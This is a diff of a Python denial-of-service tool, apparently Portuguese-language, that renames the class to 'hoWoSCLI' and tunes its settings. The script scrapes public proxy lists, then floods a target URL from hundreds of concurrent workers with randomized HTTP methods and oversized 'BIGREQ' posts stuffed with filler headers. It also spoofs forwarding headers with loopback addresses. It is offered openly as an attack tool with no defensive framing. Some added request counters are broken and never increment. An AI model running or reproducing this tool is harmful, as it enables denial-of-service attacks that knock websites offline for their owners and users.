@@ -1,3 +1,4 @@
+#region IMPORTS
 import argparse
 import asyncio
 import random
@@ -8,7 +9,9 @@ import json
 import re
 from aiohttp_socks import ProxyConnector
 import aiohttp
+#endregion
 
+#region PAYLOADS & SOURCES
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
@@ -38,12 +41,11 @@ proxy_sources = [
     "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=100&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
     "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
     "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=80&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
-    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json&anonymity=Elite,Anonymous&timeout=2419",
     "https://www.proxy-list.download/api/v1/get?type=socks4",
     "https://www.proxy-list.download/api/v1/get?type=socks5",
     "https://www.proxy-list.download/api/v1/get?type=http",
     "https://www.proxy-list.download/api/v1/get?type=https",
-    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json&anonymity=Elite,Anonymous&timeout=3217"
+    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json&anonymity=Elite,Anonymous&timeout=2217"
 ]
 
 bytes_payload = b"""\x48\x65\x6c\x6c\x6f\x2c\x20\x6d\x79\x20\x66\x72\x69\x65\x6e\x64\x2c\x20\x61\x20\x73\x65\x63\x72\x65\x74\x27\x73\x20\x62\x65\x65\x6e\x20\x74\x6f\x6c\x64\x2c
@@ -70,10 +72,12 @@ bytes_payload = b"""\x48\x65\x6c\x6c\x6f\x2c\x20\x6d\x79\x20\x66\x72\x69\x65\x6e
 \x46\x72\x6f\x6d\x20\x59\x79\x61\x78\x27\x73\x20\x74\x6f\x6f\x6c\x2c\x20\x74\x68\x65\x20\x64\x69\x67\x69\x74\x61\x6c\x20\x63\x6f\x61\x74\x2e
 \x41\x20\x77\x69\x6e\x6b\x2c\x20\x61\x20\x6e\x75\x64\x67\x65\x2c\x20\x61\x20\x73\x6c\x79\x20\x67\x6f\x6f\x64\x62\x79\x65\x2c
 \x54\x69\x6c\x6c\x20\x6e\x65\x78\x74\x20\x74\x69\x6d\x65\x2c\x20\x66\x72\x69\x65\x6e\x64\x2c\x20\x62\x65\x6e\x65\x61\x74\x68\x20\x74\x68\x65\x20\x62\x69\x6e\x61\x72\x79\x20\x73\x6b\x79\x2e""" * 3
+#endregion
 
+#region PROXY VALIDATION
 def is_valid_proxy(line):
     line = line.strip()
-    pattern = r"(?:(http|socks4|socks5)://)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})"
+    pattern = r"(?:(http|https|socks4|socks5)://)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})"
     match = re.match(pattern, line)
     if not match:
         return False
@@ -83,9 +87,11 @@ def is_valid_proxy(line):
         return all(0 <= int(part) <= 255 for part in ip.split(".")) and (0 < port <= 65535)
     except:
         return False
+#endregion
 
-class FsocietyCLI:
-    def __init__(self, target_url, num_requests, method, mix, verbose, proxy_url=None, threads=300, request_limit=50000000000):
+class hoWoSCLI:
+    #region __init__
+    def __init__(self, target_url, num_requests, method, mix, verbose, proxy_url=None, threads=350, request_limit=50000000000):
         self.target_url = target_url
         self.num_requests = num_requests
         self.method = method.upper() if not mix else None
@@ -96,7 +102,11 @@ class FsocietyCLI:
         self.request_limit = request_limit
         self.proxy_list = []
         self.methods = ["GET", "POST", "HEAD", "DELETE", "BIGREQ"]
+        self.req_success = 0
+        self.req_sent = 0
+    #endregion
 
+    #region PROXY
     async def fetch_remote_proxies(self, url, session):
         try:
             async with session.get(url, timeout=5) as resp:
@@ -185,7 +195,7 @@ class FsocietyCLI:
         connector = ProxyConnector.from_url(proxy_url)
         try:
             async with sem, aiohttp.ClientSession(connector=connector) as session:
-                async with session.get("http://httpbin.org/ip", timeout=5) as resp:
+                async with session.get("http://httpbin.org/ip", timeout=3) as resp:
                     if 200 <= resp.status < 500:
                         return proxy_url
         except:
@@ -208,9 +218,12 @@ class FsocietyCLI:
         results = await asyncio.gather(*tasks)
         self.proxy_list = [p for p in results if p is not None]
         print(f"[✓] Proxies ativos: {len(self.proxy_list)}")
+    #endregion
 
+    #region CONNECTOR
     def get_connector(self, proxy_url):
         return ProxyConnector.from_url(proxy_url)
+    #endregion
 
     async def send_request(self, method):
         proxy_url = random.choice(self.proxy_list)
@@ -227,41 +240,58 @@ class FsocietyCLI:
             "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
             "Cache-Control": "no-cache",
             "Connection": random.choice(["keep-alive", "close"]),
-            "X-Real-IP": ip_from_proxy,
-            "X-Forwarded-For": ip_from_proxy
+            "X-Real-IP": random.choice([ip_from_proxy, '0.0.0.0', '127.0.0.1', '::1']),
+            "X-Forwarded-For": '0.0.0.0, 127.0.0.1, localhost, ::1'
 
         }
 
         try:
+            #region METHODS
             async with aiohttp.ClientSession(connector=connector) as session:
                 if method == "BIGREQ":
                     for i in range(20):
-                        headers[f"X-Filler-{i}"] = random.choice(['A', 'B', 'DoS']) * random.randint(150, 350)
+                        headers[f"X-Filler-{i}"] = random.choice(['A', 'B', 'DoS']) * random.randint(150, 250)
                     payload = bytes_payload * random.randint(20, 70)
+                    self.req_sent + 1
+                    #endregion
+
+                    #region BIGREQ
                     async with session.post(self.target_url, headers=headers, data=payload, timeout=10) as resp:
+                        self.req_success + 1
                         if self.verbose:
                             print(f"[BIGREQ] via {proxy_url} | Status: {resp.status}")
+                            
                 else:
+                    self.req_sent + 1
+                    #endregion
+                    
+                    #region HTTP
                     async with session.request(method, self.target_url, headers=headers, timeout=7) as resp:
+                        self.req_success + 1
                         if self.verbose:
                             print(f"[{method}] via {proxy_url} | Status: {resp.status}")
+
         except Exception as e:
             if self.verbose:
                 print(f"[{method}-ERR] via {proxy_url} | Error: {str(e)}")
+    #endregion
 
+    #region WORKER
     async def attack_worker(self, requests_per_worker):
         for _ in range(requests_per_worker):
             method = random.choice(self.methods) if self.mix else self.method
             await self.send_request(method)
-            await asyncio.sleep(1 / self.request_limit)
+            await asyncio.sleep(1 / float(self.request_limit * 1.33333))
+    #endregion
 
+    #region ATTACK
     async def attack(self):
         await self.load_proxies()
         if not self.proxy_list:
             print("[!] Abortado: nenhum proxy disponível.")
             return
 
-        requests_per_worker = int(self.num_requests // (self.threads * 0.875)).__floor__()
+        requests_per_worker = self.num_requests // self.threads
 
         print(f"\n[*] Iniciando ataque -> {self.target_url}")
         print(f"[*] Método: {'MIXED' if self.mix else self.method}")
@@ -276,11 +306,17 @@ class FsocietyCLI:
             for r in results:
                 if isinstance(r, Exception):
                     print(f"[!] Exceção não tratada: {r}")
-        elapsed = time.time() - start
-        print(f"\n[✓] Ataque finalizado em {elapsed:.2f} segundos\n")
 
+        elapsed = time.time() - start
+        print(f"\n[?] Requisições definidas pelo usúario: {self.num_requests}")
+        print(f"[?] Requisições enviadas: {self.req_sent} ({str((self.num_requests / self.req_sent) * 100) if self.req_sent > 0 else '0'})%")
+        print(f"[?] Requisições recebidas pelo alvo: {self.req_success}")
+        print(f"\n[✓] Ataque finalizado em {elapsed:.2f} segundos\n")
+    #endregion
+
+#region MAIN
 def main():
-    parser = argparse.ArgumentParser(description="Fsociety CLI DDoS Tool (proxy rotativo, BIGREQ, coleta automática)")
+    parser = argparse.ArgumentParser(description="hoWoS CLI DDoS Tool")
     parser.add_argument("url", help="Target URL")
     parser.add_argument("requests", type=int, help="Total de requisições")
     parser.add_argument("--method", choices=["GET", "POST", "HEAD", "DELETE", "BIGREQ"], default="GET", help="Método HTTP")
@@ -291,7 +327,7 @@ def main():
 
     args = parser.parse_args()
 
-    cli = FsocietyCLI(
+    cli = hoWoSCLI(
         target_url=args.url,
         num_requests=args.requests,
         method=args.method,
@@ -307,4 +343,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("[SHUT] Abortado pelo úsuario")
+        print("[X] Abortado pelo usúario")
+#endregion
